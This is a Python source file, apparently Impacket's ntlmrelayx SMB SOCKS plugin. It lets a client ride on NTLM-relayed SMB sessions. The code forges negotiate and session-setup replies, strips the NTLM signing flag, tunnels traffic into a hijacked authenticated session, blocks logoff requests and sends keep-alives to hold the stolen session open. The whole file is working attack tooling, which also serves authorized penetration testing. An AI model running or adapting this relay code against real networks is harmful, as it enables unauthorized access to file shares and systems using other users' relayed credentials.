#!/usr/bin/env python
# Copyright (c) 2013-2017 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# A Socks Proxy for the SMB Protocol
#
# Author:
#  Alberto Solino (@agsolino)
#
# Description:
#  A simple SOCKS server that proxy connection to relayed connections
#
# ToDo:
#
from struct import unpack

from impacket import LOG
from impacket.examples.ntlmrelayx.servers.socksserver import SocksRelay
from impacket.nmb import NetBIOSTCPSession
from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_SIGN
from impacket.smb import NewSMBPacket, SMBCommand, SMB, SMBExtended_Security_Data, \
    SMBExtended_Security_Parameters, SMBNTLMDialect_Parameters, SMBNTLMDialect_Data, \
    SMBSessionSetupAndX_Extended_Response_Parameters, SMBSessionSetupAndX_Extended_Response_Data, \
    SMBSessionSetupAndX_Extended_Parameters, SMBSessionSetupAndX_Extended_Data
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, SPNEGO_NegTokenResp, ASN1_AID

# Besides using this base class you need to define one global variable when
# writing a plugin:
PLUGIN_CLASS = "SMBSocksRelay"

class SMBSocksRelay(SocksRelay):
    PLUGIN_NAME = 'SMB Socks Plugin'
    def __init__(self, targetHost, targetPort, socksSocket, activeRelays):
        SocksRelay.__init__(self, targetHost, targetPort, socksSocket, activeRelays)
        self.__NBSession = None

    @staticmethod
    def getProtocolPort():
        return 445

    def initConnection(self):
        # An incoming SMB Connection. Nice
        self.__NBSession = NetBIOSTCPSession('', 'HOST', self.targetHost, sess_port=self.targetPort, sock=self.socksSocket)

    def skipAuthentication(self):
        packet, smbCommand = self.getSMBPacket()

        if packet['Command'] == SMB.SMB_COM_NEGOTIATE:
            # Nego packet, we should answer with supporting only SMBv1
            resp = self.getNegoAnswer(packet)
            self.__NBSession.send_packet(resp.getData())
            packet, smbCommand = self.getSMBPacket()

        if packet['Command'] == SMB.SMB_COM_SESSION_SETUP_ANDX:
            # We have a session setup, let's answer what the original target answered us.
            self.clientConnection, self.username = self.processSessionSetup(packet)
            if self.clientConnection is None:
                return False

        return True

    def tunelConnection(self):
        # For the rest of the remaining packets, we should just read and send. Except when trying to log out,
        # that's forbidden! ;)
        while True:
            # 1. Get Data from client
            data = self.__NBSession.recv_packet().get_trailer()

            if len(data) == 0:
                break

            packet = NewSMBPacket(data=data)

            if packet['Command'] == SMB.SMB_COM_LOGOFF_ANDX:
                # We do NOT want to get logged off do we?
                LOG.debug('SOCKS: Avoiding logoff for %s@%s:%s' % (self.username, self.targetHost, self.targetPort))
                data = self.getLogOffAnswer(packet)
            else:
                # 2. Send it to the relayed session
                self.clientConnection._sess.send_packet(str(data))

                # 3. Get the target's answer
                data = self.clientConnection._sess.recv_packet().get_trailer()

                packet = NewSMBPacket(data=data)

                if packet['Command'] == SMB.SMB_COM_TRANSACTION or packet['Command'] == SMB.SMB_COM_TRANSACTION2:
                    try:
                        while True:
                            # Anything else to read? with timeout of 1 sec. This is something to test or find
                            # a better way to control
                            data2 = self.clientConnection._sess.recv_packet(timeout=1).get_trailer()
                            self.__NBSession.send_packet(str(data))
                            data = data2
                    except Exception, e:
                        if str(e).find('timed out') > 0:
                            pass
                        else:
                            raise

                if len(data) == 0:
                    break

            # 4. Send it back to the client
            self.__NBSession.send_packet(str(data))

        return True

    def getSMBPacket(self):
        data = self.__NBSession.recv_packet()
        try:
            packet = NewSMBPacket(data=data.get_trailer())
            smbCommand = SMBCommand(packet['Data'][0])
        except Exception, e:
            LOG.error('SOCKS: %s' % str(e))
            return None, None

        return packet, smbCommand

    @staticmethod
    def getNegoAnswer(recvPacket):
        smbCommand = SMBCommand(recvPacket['Data'][0])
        respSMBCommand = SMBCommand(SMB.SMB_COM_NEGOTIATE)

        resp = NewSMBPacket()
        resp['Flags1'] = SMB.FLAGS1_REPLY
        resp['Pid'] = recvPacket['Pid']
        resp['Tid'] = recvPacket['Tid']
        resp['Mid'] = recvPacket['Mid']

        dialects = smbCommand['Data'].split('\x02')
        index = dialects.index('NT LM 0.12\x00') - 1
        # Let's fill the data for NTLM
        if recvPacket['Flags2'] & SMB.FLAGS2_EXTENDED_SECURITY:
            resp['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_UNICODE
            _dialects_data = SMBExtended_Security_Data()
            _dialects_data['ServerGUID'] = 'A' * 16
            blob = SPNEGO_NegTokenInit()
            blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
            _dialects_data['SecurityBlob'] = blob.getData()

            _dialects_parameters = SMBExtended_Security_Parameters()
            _dialects_parameters[
                'Capabilities'] = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_NT_SMBS | SMB.CAP_UNICODE
            _dialects_parameters['ChallengeLength'] = 0

        else:
            resp['Flags2'] = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_UNICODE
            _dialects_parameters = SMBNTLMDialect_Parameters()
            _dialects_data = SMBNTLMDialect_Data()
            _dialects_data['Payload'] = ''
            _dialects_data['Challenge'] = '\x11\x22\x33\x44\x55\x66\x77\x88'
            _dialects_parameters['ChallengeLength'] = 8
            _dialects_parameters['Capabilities'] = SMB.CAP_USE_NT_ERRORS | SMB.CAP_NT_SMBS

        _dialects_parameters['Capabilities'] |= SMB.CAP_RPC_REMOTE_APIS
        _dialects_parameters['DialectIndex'] = index
        _dialects_parameters['SecurityMode'] = SMB.SECURITY_AUTH_ENCRYPTED | SMB.SECURITY_SHARE_USER
        _dialects_parameters['MaxMpxCount'] = 1
        _dialects_parameters['MaxNumberVcs'] = 1
        _dialects_parameters['MaxBufferSize'] = 64000
        _dialects_parameters['MaxRawSize'] = 65536
        _dialects_parameters['SessionKey'] = 0
        _dialects_parameters['LowDateTime'] = 0
        _dialects_parameters['HighDateTime'] = 0
        _dialects_parameters['ServerTimeZone'] = 0

        respSMBCommand['Data'] = _dialects_data
        respSMBCommand['Parameters'] = _dialects_parameters

        resp.addCommand(respSMBCommand)

        return resp

    def processSessionSetup(self, recvPacket):
        respSMBCommand = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        smbCommand = SMBCommand(recvPacket['Data'][0])

        if smbCommand['WordCount'] == 12:
            respParameters = SMBSessionSetupAndX_Extended_Response_Parameters()
            respData = SMBSessionSetupAndX_Extended_Response_Data()

            # First of all, we should received a type 1 message. Let's answer it
            # NEGOTIATE_MESSAGE
            challengeMessage = self.smbData['CHALLENGE_MESSAGE']
            challengeMessage['flags'] &= ~(NTLMSSP_NEGOTIATE_SIGN)

            respToken = SPNEGO_NegTokenResp()
            # accept-incomplete. We want more data
            respToken['NegResult'] = '\x01'
            respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
            respToken['ResponseToken'] = str(challengeMessage)

            respParameters['SecurityBlobLength'] = len(respToken)
            respData['SecurityBlobLength'] = respParameters['SecurityBlobLength']
            respData['SecurityBlob'] = respToken.getData()

            respData['NativeOS'] = ''
            respData['NativeLanMan'] = ''
            respSMBCommand['Parameters'] = respParameters
            respSMBCommand['Data'] = respData

            resp = NewSMBPacket()
            resp['Flags1'] = SMB.FLAGS1_REPLY
            resp['Flags2'] = SMB.FLAGS2_NT_STATUS
            resp['Pid'] = recvPacket['Pid']
            resp['Tid'] = recvPacket['Tid']
            resp['Mid'] = recvPacket['Mid']
            resp['Uid'] = 0
            errorCode = STATUS_MORE_PROCESSING_REQUIRED
            resp['ErrorCode'] = errorCode >> 16
            resp['ErrorClass'] = errorCode & 0xff
            resp.addCommand(respSMBCommand)

            self.__NBSession.send_packet(resp.getData())
            recvPacket, smbCommand = self.getSMBPacket()

            sessionSetupParameters = SMBSessionSetupAndX_Extended_Parameters(smbCommand['Parameters'])
            sessionSetupData = SMBSessionSetupAndX_Extended_Data()
            sessionSetupData['SecurityBlobLength'] = sessionSetupParameters['SecurityBlobLength']
            sessionSetupData.fromString(smbCommand['Data'])

            if unpack('B', sessionSetupData['SecurityBlob'][0])[0] != ASN1_AID:
                # If there no GSSAPI ID, it must be an AUTH packet
                blob = SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
                token = blob['ResponseToken']
            else:
                # NEGOTIATE packet
                blob = SPNEGO_NegTokenInit(sessionSetupData['SecurityBlob'])
                token = blob['MechToken']

            # Now we should've received a type 3 message
            authenticateMessage = NTLMAuthChallengeResponse()
            authenticateMessage.fromString(token)

            # Check if we have a connection for the user
            if self.activeRelays.has_key(authenticateMessage['user_name']):
                LOG.info('SOCKS: Proxying client session for %s@%s(445)' % (
                authenticateMessage['user_name'].decode('utf-16le'), self.targetHost))
                errorCode = STATUS_SUCCESS
                smbClient = self.activeRelays[authenticateMessage['user_name']]['client']
                uid = smbClient.get_uid()
            else:
                LOG.error('SOCKS: No session for %s@%s(445) available' % (
                authenticateMessage['user_name'].decode('utf-16le'), self.targetHost))
                errorCode = STATUS_ACCESS_DENIED
                uid = 0

            resp = NewSMBPacket()
            resp['Flags1'] = recvPacket['Flags1'] | SMB.FLAGS1_REPLY
            resp['Flags2'] = recvPacket['Flags2'] | SMB.FLAGS2_EXTENDED_SECURITY
            resp['Command'] = recvPacket['Command']
            resp['Pid'] = recvPacket['Pid']
            resp['Tid'] = recvPacket['Tid']
            resp['Mid'] = recvPacket['Mid']
            resp['Uid'] = uid
            resp['ErrorCode'] = errorCode >> 16
            resp['ErrorClass'] = errorCode & 0xff
            respData['NativeOS'] = ''
            respData['NativeLanMan'] = ''

            if uid == 0:
                resp['Data'] = '\x00\x00\x00'
                smbClient = None
            else:
                respToken = SPNEGO_NegTokenResp()
                # accept-completed
                respToken['NegResult'] = '\x00'
                respParameters['SecurityBlobLength'] = len(respToken)
                respData['SecurityBlobLength'] = respParameters['SecurityBlobLength']
                respData['SecurityBlob'] = respToken.getData()

                respSMBCommand['Parameters'] = respParameters
                respSMBCommand['Data'] = respData
                resp.addCommand(respSMBCommand)

            self.__NBSession.send_packet(resp.getData())
            return smbClient, authenticateMessage['user_name']
        else:
            LOG.error('SOCKS: Can\'t handle standard security at the moment!')
            return None

    @staticmethod
    def getLogOffAnswer(recvPacket):
        respSMBCommand = SMBCommand(SMB.SMB_COM_LOGOFF_ANDX)

        resp = NewSMBPacket()
        resp['Flags1'] = SMB.FLAGS1_REPLY
        resp['Pid'] = recvPacket['Pid']
        resp['Tid'] = recvPacket['Tid']
        resp['Mid'] = recvPacket['Mid']
        resp['Uid'] = recvPacket['Uid']

        respParameters = ''
        respData = ''
        respSMBCommand['Parameters']   = respParameters
        respSMBCommand['Data']         = respData

        resp.addCommand(respSMBCommand)
        return resp

    @staticmethod
    def keepAlive(connection):
        # Just a tree connect / disconnect to avoid the session timeout
        tid = connection.connect_tree('IPC$')
        connection.disconnect_tree(tid)


